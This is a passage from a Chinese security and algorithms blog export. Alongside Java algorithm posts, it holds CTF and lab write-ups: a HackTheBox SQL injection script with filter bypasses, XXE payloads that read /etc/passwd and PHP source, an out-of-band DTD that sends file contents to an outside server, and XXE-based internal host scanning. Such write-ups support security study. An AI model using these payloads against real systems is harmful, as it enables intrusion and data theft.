方式一，使用额外空间判断是否遍历过。12345678910111213public ListNode detectCycle1(ListNode head) &#123; ListNode node = head; HashSet&lt;ListNode&gt; visitedSet = new HashSet&lt;&gt;(); while(node != null)&#123; if(visitedSet.contains(node))&#123; break; &#125;else&#123; visitedSet.add(node); &#125; node = node.next; &#125; return node; &#125; 方法二，快慢指针法慢指针：每次走一步 快指针：每次走两步 如果快慢指针相遇且任意一个指针不为null则一定存在环。 首结点索引0，环起点索引b，环终点索引e，相遇点索引m，环长（e-b+1）. 相遇时间为t $$ 2t=b-1+(m-b+1)+(e-b+1)*k1$$ k1圈 $$ t=b-1+(m-b+1)+(e-b+1)*k2 $$ k2圈 简化: $$ 2t=m+(e-b+1)*k1$$ $$ t= m+(e-b+1)*k2$$ 再简化： $$ t=(e-b+1)*(k1-k2) $$ 只知道t，目标是求b。方程组是求不出来的。 现在证明一个问题，k2=0。相当于证明$$t&lt;e$$ 经过问题分析，总结结论： 结论一 、如果快指针在慢指针后面，快指针想超过慢指针，它们必须会相遇。 证明： （1）如果快指针比慢指针慢1步。下1s慢指针走1步，快指针走2步，快慢相遇。 （2）如果快指针比慢指针慢2步，下1s慢指针走1步，快指针走2步，快指针比慢指针慢1。问题转化为（1） （3）其他问题都可以归纳为问题（1）和问题（2），即归纳为问题（1） 所以一定会相遇。 结论二、慢指针第一次到达环尾必定和快指针相遇至少一次。 反证法:假设慢指针第一次到达环尾都没有和快指针相遇过。 慢指针到达环尾走了e步。此时快指针走了2e步。 慢指针走了b步，就在环头了。此时快指针走了2b步，且肯定在环上。 此时分为两种情况： （1）快指针和慢指针都在环头。此时快慢指针相遇，与假设矛盾。 （2）快指针不在环头，假设快指针此时在索引k点。接下来慢指针走（e-b）步到达e点，此时快指针亦走了2（e-b）步。而环的总长度为（e-b）。快指针在环上走了两圈，快指针在环上走了一圈，肯定存在快指针超过慢指针情况。根据结论一，快慢指针必定会相遇，与假设矛盾。 所以慢指针第一次到达环尾必定和快指针相遇至少一次。 所以问题可以简化为： $$t=m$$ $$ 2t=m+(e-b+1)*k1 $$ 即$$t=m=(e-b+1)*k1$$ 现在慢指针走(e-m+1)+(e-b+1)*k步可以到达入口点，其中k为任意常数，代表圈数。 如果同时有个慢指针（每次只走一步）从链头出发，走b步可以到达环头。 如果在快慢指针相遇时，有一个慢指针s2从链头参加走动，则当这个慢指针第一次到达环头时会和另一个慢指针s1相遇 慢指针s2到达环头时走了b步,此时s2也走了b步。 由下面分析发现此时s2也在环头，且走路（k1-1）圈。 因此代码就很简单了。s1和s2第一次相遇点即为环头。 1234567891011121314151617181920212223242526public ListNode detectCycle(ListNode head) &#123; if(head==null)&#123; return null; &#125; ListNode slow1Pointer = head; ListNode quickPointer = head; int t = 0; do&#123; slow1Pointer = slow1Pointer.next; ListNode tmpQuickPointer = quickPointer.next; if (tmpQuickPointer == null)&#123; return null; &#125; quickPointer = tmpQuickPointer.next; if(quickPointer == null)&#123; return null; &#125; t++; &#125;while (slow1Pointer != quickPointer); ListNode slow2Pointer = head; while(slow1Pointer != slow2Pointer)&#123; slow2Pointer = slow2Pointer.next; slow1Pointer = slow1Pointer.next; &#125; return slow1Pointer; &#125; 效率：","categories":[{"name":"算法","slug":"算法","permalink":"http://blog.ydq6.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://blog.ydq6.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"链表","slug":"链表","permalink":"http://blog.ydq6.com/tags/%E9%93%BE%E8%A1%A8/"}]},{"title":"hackthebox_expz","slug":"hackthebox-expz","date":"2020-05-13T15:57:22.000Z","updated":"2020-05-13T15:58:10.530Z","comments":true,"path":"web/hackthebox-expz/","link":"","permalink":"http://blog.ydq6.com/web/hackthebox-expz/","excerpt":"本文主要讲解hackthebox上的20分挑战ezpz","text":"本文主要讲解hackthebox上的20分挑战ezpz (1)创建实例 创建示例，然后进入发现是个网站： 需要参数obj，随便输入obj参数，发现ID属性还是没有。 （2）扫描 用dirb扫描网站： 打开所有文件，发现都是一样的。 （3）漏洞挖掘 既然只有一个文件，那思路就在这个文件。发现源码中最下面（特别隐蔽的点）有个提示 1&lt;!-- Hint : base64_encode($data)--&gt; 然后obj有个属性ID,所以添加参数后encode。 1obj=&#123;\"ID\":1&#125; encode后： 1obj=eyJJRCI6MX0= 成功: 所以可以在ID处看下有注入没有。 由于手工测试比较麻烦，所以写脚本测试： 1234567891011import requestsimport base64url=\"http://docker.hackthebox.eu:31417/?obj=\"def send(ID): param = '&#123;\"ID\":\"%s\"&#125;'%ID param = base64.b64encode(param.encode()).decode() cur_url = url+param print(cur_url) content = requests.get(cur_url).content.decode('utf-8') if(len(content) != 393): print(content) 123456send(\"1#\") 正确send(\"1' and 1#\") 正确send(\"1' order by 1 #\") order 被拦截了send(\"1' union select 1 #\") 正确send(\"1' union select 1,2 #\") block了，猜想是block了，send(\"1', #\") block，确实block了逗号 由于过滤了逗号，所以在网上找过滤逗号思路，找到了一种： 1union select * from ((select 1)A join (select 2)B join (select 3)C）; 继续注入： 12345678910send(\"1' union select * from ((select 1)A join (select 2)B) #\") 成功测试回显位：send(\"-1' union select * from ((select 1)A join (select 2)B) #\") 发现显示2，证明第2位为回显位。接下来测试哪些关键词被过滤了：send(\"information_schema.tables\") blcok了，经尝试有schema.tables关键词则会报错。然而数据库和表名都可以加`send(\"`schema`.`tables`\") 成功，成功绕过。send(\"where table_schema=database()\") block了，经测试是where被block了。send(\"group_concat(table_name)\") group_concat被block了 尝试： 1send(\"-1' union select * from ((select 1)A join (select table_name from information_schema.`tables`)B) #\") 访问: 1http://docker.hackthebox.eu:31417/?obj=eyJJRCI6Ii0xJyB1bmlvbiBzZWxlY3QgKiBmcm9tICgoc2VsZWN0IDEpQSBqb2luIChzZWxlY3QgdGFibGVfbmFtZSBmcm9tIGBpbmZvcm1hdGlvbl9zY2hlbWFgLmB0YWJsZXNgKUIpICMifQ== 得到表： 仔细观察发现可疑表：FlagTableUnguessableEzPZ 直接select 尝试： 1send(\"-1' union select * from ((select 1)A join (select * from FlagTableUnguessableEzPZ)B) #\") 运气好，只有一个字段，显示出flag: 1HTB&#123;T0oE4syP34syL4m3SQLiF!lt3rs&#125;","categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"hack_the_box","slug":"hack-the-box","permalink":"http://blog.ydq6.com/tags/hack-the-box/"},{"name":"sql注入","slug":"sql注入","permalink":"http://blog.ydq6.com/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"MyWebServer1靶机练习","slug":"MyWebServer1靶机练习","date":"2020-05-13T05:53:59.000Z","updated":"2020-05-13T05:53:59.660Z","comments":true,"path":"uncategorized/MyWebServer1靶机练习/","link":"","permalink":"http://blog.ydq6.com/uncategorized/MyWebServer1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"XXE漏洞实验","slug":"XXE漏洞实验","date":"2020-05-13T02:18:17.000Z","updated":"2020-05-13T13:11:50.673Z","comments":true,"path":"web/XXE漏洞实验/","link":"","permalink":"http://blog.ydq6.com/web/XXE%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C/","excerpt":"XXE漏洞实验 本文主要为XXE漏洞实战。","text":"XXE漏洞实验 本文主要为XXE漏洞实战。 靶场实验有回显XXE代码审计看一下js代码（test1.js）。 12345678910111213141516171819202122232425262728293031323334function doLogin()&#123; var username = $(\"#username\").val(); var password = $(\"#password\").val(); if(username == \"\" || password == \"\")&#123; alert(\"Please enter the username and password!\"); return; &#125; var data = \"&lt;user&gt;&lt;username&gt;\" + username + \"&lt;/username&gt;&lt;password&gt;\" + password + \"&lt;/password&gt;&lt;/user&gt;\"; $.ajax(&#123; type: \"POST\", url: \"doLogin1.php\", contentType: \"application/xml;charset=utf-8\", data: data, dataType: \"xml\", anysc: false, success: function (result) &#123; var code = result.getElementsByTagName(\"code\")[0].childNodes[0].nodeValue; var msg = username; if(code == \"0\")&#123; $(\".msg\").text(msg + \" login fail!\"); &#125;else if(code == \"1\")&#123; $(\".msg\").text(msg + \" login success!\"); alert(\"login success!\"); &#125;else&#123; $(\".msg\").text(\"error:\" + msg); &#125; &#125;, error: function (XMLHttpRequest,textStatus,errorThrown) &#123; $(\".msg\").text(errorThrown + ':' + textStatus); &#125; &#125;); &#125; 是一个ajax请求，传入的是xml，所以可以使用xxe。 而且在源码审计中发现口令在： 1/tmp/password.txt 所以XXE读这个文件即可。 在登录框输入账户名：admin,密码:123. 抓到包： 123456789101112131415POST /vulnlab/xxe/doLogin1.php HTTP/1.1Host: 47.105.75.177Content-Length: 63Accept: application/xml, text/xml, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36Content-Type: application/xml;charset=UTF-8Origin: http://47.105.75.177Referer: http://47.105.75.177/vulnlab/xxe/index1.htmlAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: BkGOp9578O_think_template=default; UM_distinctid=171e9e4df09110-01bb29db0210e5-c373667-1fa400-171e9e4df0a352; CNZZDATA1257137=cnzz_eid%3D1631752570-1588767023-http%253A%252F%252F47.105.75.177%252F%26ntime%3D1588864880; CNZZDATA3801251=cnzz_eid%3D1725538590-1588767023-http%253A%252F%252F47.105.75.177%252F%26ntime%3D1589014034; DedeUserID=15; DedeUserID__ckMd5=b150f3b13efab666; DedeLoginTime=1589018256; DedeLoginTime__ckMd5=47d5213a542b9f30Connection: close&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt; 发现响应中包含admin，所以是带回显的XXE。把需要显示的值放在username里就可以了。 (1)读文件 XXE读文件： 1234&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE gvi [ &lt;!ENTITY xxe SYSTEM \"file:///tmp/password.txt\" &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt; 但发现读取不成功。 再尝试： 1234&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE user [ &lt;!ENTITY xxe SYSTEM \"file:///tmp/password.txt\" &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt; 也不行。 尝试其他文件（/etc/passwd）： 读取成功，看来那个文件可能不存在。 （2）读源码 使用php伪协议读取源码： 1234&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE gvi [ &lt;!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=doLogin1.php\" &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt; 源码： 1234567891011121314151617181920212223242526272829303132&lt;?php$USERNAME = 'heetianlab'; //è´¦å·$PASSWORD = 'test009'; //å¯ç $result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');try&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $password = $creds-&gt;password; if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123; $result1 = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\",1,$username); $result = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;/result&gt;\",1); &#125;else&#123; $result1 = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\",0,$username); $result = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;/result&gt;\",0); &#125; &#125;catch(Exception $e)&#123; $result1 = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\",3,$e-&gt;getMessage()); $result = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;/result&gt;\",3);&#125;header('Content-Type: text/html; charset=utf-8');echo $result1;?&gt; 得到用户名：heetianlab，密码：test009 无回显XXE同样的登录时候抓包，发现没回显了： 这时候就要我们的远程服务器进行攻击了. evil2.dtd: 123&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=doLogin2.php\"&gt;&lt;!ENTITY % all \"&lt;!ENTITY &amp;#37; send SYSTEM 'http://104.243.21.153:8998/%file;'&gt;\"&gt;%all; 构造请求包： 1234567&lt;!DOCTYPE root [&lt;!ENTITY % dtd SYSTEM \"http://104.243.21.153/xxe/evil2.dtd\"&gt;%dtd;%int;%send;]&gt;&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt; 服务器端得到数据： 即： 1PD9waHAKCgokVVNFUk5BTUUgPSAnaGVldGlhbmxhYic7IC8v6LSm5Y+3CiRQQVNTV09SRCA9ICd0ZXN0MDA5JzsgLy/lr4bnoIEKJHJlc3VsdCA9IG51bGw7CgpsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyKGZhbHNlKTsKJHhtbGZpbGUgPSBmaWxlX2dldF9jb250ZW50cygncGhwOi8vaW5wdXQnKTsKCnRyeXsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRjcmVkcyA9IHNpbXBsZXhtbF9pbXBvcnRfZG9tKCRkb20pOwoKCSR1c2VybmFtZSA9ICRjcmVkcy0+dXNlcm5hbWU7CgkkcGFzc3dvcmQgPSAkY3JlZHMtPnBhc3N3b3JkOwoKCWlmKCR1c2VybmFtZSA9PSAkVVNFUk5BTUUgJiYgJHBhc3N3b3JkID09ICRQQVNTV09SRCl7CgkJJHJlc3VsdDEgPSBzcHJpbnRmKCI8cmVzdWx0Pjxjb2RlPiVkPC9jb2RlPjxtc2c+JXM8L21zZz48L3Jlc3VsdD4iLDEsJHVzZXJuYW1lKTsKCQkkcmVzdWx0ID0gc3ByaW50ZigiPHJlc3VsdD48Y29kZT4lZDwvY29kZT48L3Jlc3VsdD4iLDEpOwoJfWVsc2V7CgkJJHJlc3VsdDEgPSBzcHJpbnRmKCI8cmVzdWx0Pjxjb2RlPiVkPC9jb2RlPjxtc2c+JXM8L21zZz48L3Jlc3VsdD4iLDAsJHVzZXJuYW1lKTsKCQkkcmVzdWx0ID0gc3ByaW50ZigiPHJlc3VsdD48Y29kZT4lZDwvY29kZT48L3Jlc3VsdD4iLDApOwoJfQkKfWNhdGNoKEV4Y2VwdGlvbiAkZSl7CgkkcmVzdWx0MSA9IHNwcmludGYoIjxyZXN1bHQ+PGNvZGU+JWQ8L2NvZGU+PG1zZz4lczwvbXNnPjwvcmVzdWx0PiIsMywkZS0+Z2V0TWVzc2FnZSgpKTsKCSRyZXN1bHQgPSBzcHJpbnRmKCI8cmVzdWx0Pjxjb2RlPiVkPC9jb2RlPjwvcmVzdWx0PiIsMyk7Cn0KCmhlYWRlcignQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgnKTsKZWNobyAkcmVzdWx0Owo/Pg== 注意去掉最前面的斜杠。 base64解码得到源码： 123456789101112131415161718192021222324252627282930313233&lt;?php$USERNAME = 'heetianlab'; //è´¦å·$PASSWORD = 'test009'; //å¯ç $result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');try&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $password = $creds-&gt;password; if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123; $result1 = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\",1,$username); $result = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;/result&gt;\",1); &#125;else&#123; $result1 = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\",0,$username); $result = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;/result&gt;\",0); &#125; &#125;catch(Exception $e)&#123; $result1 = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;\",3,$e-&gt;getMessage()); $result = sprintf(\"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;/result&gt;\",3);&#125;header('Content-Type: text/html; charset=utf-8');echo $result;?&gt; 注意下面这种方式容易带不出数据： 12&lt;!DOCTYPE root SYSTEM \"http://104.243.21.153/xxe/evil2.dtd\"&gt;&lt;user&gt;&lt;username&gt;&amp;send&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt; XML外部实体注入漏洞实验一 DTD学习（1）内部实体声明： 内部实体声明语法： 1&lt;!ENTITY 实体名称 \"实体的值\"&gt; getxml.php源码： 123456&lt;?php $xml = simplexml_load_string($_GET['XML'],'simplexmlElement',LIBXML_NOENT); echo \"&lt;pre&gt;\"; print_r($xml); echo \"&lt;/pre&gt;\";?&gt; 使用浏览器访问： 1localhost/xml/getxml.php?xml=&lt;!DOCTYPE books[&lt;!ENTITY test \"Hello World\"&gt;]&gt;&lt;books&gt;%26test;&lt;/books&gt; 注意&amp;要url编码为%26不然会被识别为参数分隔符&amp;符号。 （2）外部实体声明语法 123&lt;!ENTITY 实体名称 SYSTEM \"URI/URL\"&gt; 同样使用浏览器访问： 1localhost/xml/getxml.php?xml=&lt;!DOCTYPE books[&lt;!ENTITY test SYSTEM \"http://localhost/xmltest.txt\"&gt;]&gt;&lt;books&gt;%26test;&lt;/books&gt; 注意，从实体的引用分为三类： 一般实体 直接使用&amp;实体名; 进行引用 预定义实体 就是有些特殊符号需要实体化。 参数实体 用 % 实体名称 定义。 （3）参数实体 12内部：&lt;!ENTITY % 实体名称 \"实体值\"&gt;外部：&lt;!ENTITY % 实体名称 SYSTEM \"URI\"&gt; 用浏览器访问 1localhost/xml/getxml.php?xml=&lt;!DOCTYPE books[&lt;!ENTITY %25 test \"&lt;!ENTITY hello ‘hello world’&gt;\"&gt;%25test;]&gt;&lt;books&gt;%26hello;&lt;/books&gt; 实验二 有回显的本地文件读取漏洞代码： 123456789&lt;?php libxml_disable_entity_loader(false); $xmlfile = file_get_contents(‘php://input’); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile,LIBXML_NOENT|LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); echo $creds;?&gt; 正常get请求： 添加body： 读文件： 读带有特殊符号文件： 发现报错，所以要使用CDATA CDATA: 1&lt;![CDATA[内容]]&gt; 而且要引用外部实体 其中evil.dtd: 1&lt;!ENTITY evil \"%start;%xxe;%end;\" 注意这里逻辑是： （1）执行DTD中%data （2）%data执行获取远程dtd （3）执行&evil; （4）&amp;evil执行中执行%start;%xxe;%end; （5）执行CDATA获取远程文件。 实验三 无回显的本地文件读取。源码： 1234567&lt;?php libxml_disable_entity_loader(false); $xmlfile = file_get_contents(‘php://input’); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile,LIBXML_NOENT|LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); ?&gt; 不同的就是没有echo响应数据。 首先本地端口监听数据： 请求包payload: 12&lt;!DOCTYPE root SYSTEM \"http://localhost/xml/evil2.dtd\"&gt;&lt;creds&gt;&amp;send&lt;/creds&gt; evil2.dtd: 123&lt;!ENTITY % xxe SYSTEM \"php://filter/read-convert.base64-encode/resource=http://localhost/xmltest2.txt\"&gt;&lt;!ENTITY % dtd \"&lt;!ENTITY send SYSTEM 'http://10.1.1.123:8888/?%xxe;'&gt;\"&gt;%dtd; base64解码后得到内容： 实验四 利用XXE进行内网主机探测。利用先前有回显的XXE进行内网主机探测,探测原理是访问内网每个ip地址的80端口，观看response。 如图所示，访问主机： 所以直接用burp扫描即可。 当响应有如下时即代表主机不存活。 其他代表存活，一共有3台机器存活， 防御方法： （1）过滤用户输入的html数据，以及一些关键词。 （2）禁用外部实体： libxml_disable_entity_loader(true); DocumentBuilderFactorydbf =DocumentBuilderFactory.new**Instance**(); dbf.setExpandEntityReferences(false); 参考： http://www.hetianlab.com/expc.do?ce=e84d7a28-357a-4a01-996c-31d2dd21a810","categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"xxe","slug":"xxe","permalink":"http://blog.ydq6.com/tags/xxe/"}]},{"title":"求数组连续最大和","slug":"求数组连续最大和","date":"2020-05-12T15:20:34.000Z","updated":"2020-06-03T13:48:36.997Z","comments":true,"path":"算法/求数组连续最大和/","link":"","permalink":"http://blog.ydq6.com/%E7%AE%97%E6%B3%95/%E6%B1%82%E6%95%B0%E7%BB%84%E8%BF%9E%E7%BB%AD%E6%9C%80%E5%A4%A7%E5%92%8C/","excerpt":"","text":"题目描述： 一个有n个元素的数组，这个元素的数组既可以是正数又可以是负数，数组中连续的一个元素或多个元素可以组成一个连续的子数组，一个数组可能有很多个子数组，求子数组和的最大值。 方法一：设$$sum[i][j]$$为从i到j的数组和（其中i&lt;j），则计算出所有的sum即可。 sum计算公式： 1sum[i][j] = sum[i][j-1] + a[j] （1-1） 计算顺序，如图所示，画出一个二维数组表，其中值对应的就是$$sum[i][j]$$。 （1）先计算对角线上元素值。 （2）从第一行开始从左往右计算出值，并且每次计算的值和最大的值比较。计算方法为上面的公式（1-1） （3）从2-n行开始从左往右计算出值，并且每次计算的值和最大的值比较。 方法二： 动态规划方法： dp[i]为以nums[i]结尾的最大子序列和。则： （1）如果nums[i]&gt;dp[i-1]而且dp[i-1]&lt;0，那么 dp[i]=nums[i] （2）如果dp[i-1]&gt;0，dp[i]=dp[i-1]+nums[i] 所以： 123456789101112131415int len = nums.length; int[] dp = new int[len]; dp[0]=nums[0]; int maxValue = dp[0]; for(int i =1;i &lt; len;i++)&#123; if(dp[i-1]&lt;0)&#123; dp[i] = nums[i]; &#125;else&#123; dp[i] = nums[i]+dp[i-1]; &#125; if(dp[i] &gt; maxValue)&#123; maxValue = dp[i]; &#125; &#125; return maxValue; 感觉可以减少空间复杂度，dp没必要，用一个变量就可以了。 改进后：","categories":[{"name":"算法","slug":"算法","permalink":"http://blog.ydq6.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://blog.ydq6.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"数组","slug":"数组","permalink":"http://blog.ydq6.com/tags/%E6%95%B0%E7%BB%84/"}]},{"title":"vulnhub_xxe","slug":"vulnhub-xxe","date":"2020-05-12T14:36:41.000Z","updated":"2020-05-12T15:15:34.928Z","comments":true,"path":"渗透测试/vulnhub-xxe/","link":"","permalink":"http://blog.ydq6.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/vulnhub-xxe/","excerpt":"vulnhub xxe实验(1)主机发现首先ifconfig查看当前ip地址： 10.1.1.92 然后利用netdiscover被动扫描扫描局域网机器。","text":"vulnhub xxe实验(1)主机发现首先ifconfig查看当前ip地址： 10.1.1.92 然后利用netdiscover被动扫描扫描局域网机器。 1netdiscover -r 10.1.1.92/24 发现两台机器，90，91，93 利用Nmap扫描端口： 12vim ip.txt #将要扫描的ip列表写进ip.txtnmap -sV -p 1-65535 -iL ip.txt -v 结果如下： 访问91机器，发现是apache目录，找到目标。 （2）网站扫描利用kali的dirb扫描: 关键文件：robots.txt 访问发现： 可以访问xxe目录，发现有登录栏。 访问admin.php，发现400了。所以猜想可能是xxe下的admin.php 又发现一个登录页面。所以可以知道后面个登录是管理员登录，前面个登录是用户登录。 漏洞挖掘访问10.1.1.91/xxe 输入Name和Password: 抓包: 发现请求是xml请求，猜想有xxe,验证一下。 构造payload,验证漏洞 漏洞存在。 构造payload读取源码: 12&lt;!DOCTYPE root[&lt;!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=xxe.php\"&gt;] &gt;&amp;xxe; 然后再解码： 成功读取，再读admin.php，并解码： 查出账户名为administhebest。密码的md5为 e6e061838856bf47e1de730719fb2609，md5解密后为admin@123. admin.php处输入账号密码： 得到flag: 点击后发现跳转空了，加一个xxe目录就可以。 可能flag在源码里，那就读源码： 得到flag：JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5。 flag还可以再解码： L2V0Yy8uZmxhZy5waHA= 再base64解码： /etc/.flag.php 再读，由于是在etc目录下，所以用file协议读： 很明显有加密，本地解密得到: 发现不成功，原来是最后的?&gt;标识符打错了。 重写后发现访问虽然成功了，但是没有结果。重新换一台windows电脑解密即可，flag: SAFCSP{xxe_is_so_easy}","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://blog.ydq6.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"http://blog.ydq6.com/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"xxe","slug":"xxe","permalink":"http://blog.ydq6.com/tags/xxe/"}]},{"title":"面试算法题系列","slug":"面试算法题系列","date":"2020-05-12T14:31:48.000Z","updated":"2020-05-25T08:07:53.366Z","comments":true,"path":"算法/面试算法题系列/","link":"","permalink":"http://blog.ydq6.com/%E7%AE%97%E6%B3%95/%E9%9D%A2%E8%AF%95%E7%AE%97%E6%B3%95%E9%A2%98%E7%B3%BB%E5%88%97/","excerpt":"本文主要描述自己练习的算法题总结，会经常更新。","text":"本文主要描述自己练习的算法题总结，会经常更新。 字符串数组求数组连续最大和 寻找两个正序数组的中位数 链表环形链表求环 队列和栈设计一个LRU缓存系统 排序动态规划","categories":[{"name":"算法","slug":"算法","permalink":"http://blog.ydq6.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://blog.ydq6.com/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"SkyConCTF2016靶机测试","slug":"SkyConCTF2016靶机测试","date":"2020-05-06T15:07:27.000Z","updated":"2020-05-06T15:17:15.654Z","comments":true,"path":"渗透测试/SkyConCTF2016靶机测试/","link":"","permalink":"http://blog.ydq6.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/SkyConCTF2016%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/","excerpt":"1、IP探测 netdiscover -i eth0 弹出mac地址08:00:27:d3:70:74对应的ip地址为192.168.43.248","text":"1、IP探测 netdiscover -i eth0 弹出mac地址08:00:27:d3:70:74对应的ip地址为192.168.43.248 2、扫描端口 (1)nmap -sV -O 192.168.43.248 12345678910111213Nmap scan report for skydogconctf2016 (192.168.43.248)Host is up (0.0019s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION22/tcp closed ssh80/tcp open http Apache httpd 2.4.18 ((Ubuntu))443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu))MAC Address: 08:00:27:D3:70:74 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.10 - 4.8Network Distance: 1 hop 只开了两个端口，80，443.Ubuntu系统 (2)扫描常见漏洞 nmap –script=vuln 192.168.43.248 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354Starting Nmap 7.50 ( https://nmap.org ) at 2018-06-02 10:06 CSTPre-scan script results:| broadcast-avahi-dos:| Discovered hosts:| 224.0.0.251| After NULL UDP avahi packet DoS (CVE-2011-1002).|_ Hosts are all up (not vulnerable).Nmap scan report for skydogconctf2016 (192.168.43.248)Host is up (0.00096s latency).Not shown: 997 filtered portsPORT STATE SERVICE22/tcp closed ssh80/tcp open http|_http-csrf: Couldn't find any CSRF vulnerabilities.|_http-dombased-xss: Couldn't find any DOM based XSS.| http-slowloris-check:| VULNERABLE:| Slowloris DOS attack| State: LIKELY VULNERABLE| IDs: CVE:CVE-2007-6750| Slowloris tries to keep many connections to the target web server open and hold| them open as long as possible. It accomplishes this by opening connections to| the target web server and sending a partial request. By doing so, it starves| the http server's resources causing Denial Of Service.|| Disclosure date: 2009-09-17| References:| http://ha.ckers.org/slowloris/|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750| http-sql-injection:| Possible sqli for queries:|_ http://skydogconctf2016/assets/js/c,l.type=a),l.width=l.height=%220%22,l.onerror=l.onload=l.onreadystatechange=function()%7bk.call(this,r)%7d,p.splice(e,0,u),%22img%22!=a&amp;&amp;(r%7c%7c2===y%5bc%5d?%28t%2einsertBefore%28l%2cs%3fnull%3an%29%2cm%28k%2cj%29%29%3ay%5bc%5d%2epush%28l%29%29%7dfunction=%27%20OR%20sqlspider|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.443/tcp open https|_http-csrf: Couldn't find any CSRF vulnerabilities.|_http-dombased-xss: Couldn't find any DOM based XSS.| http-slowloris-check:| VULNERABLE:| Slowloris DOS attack| 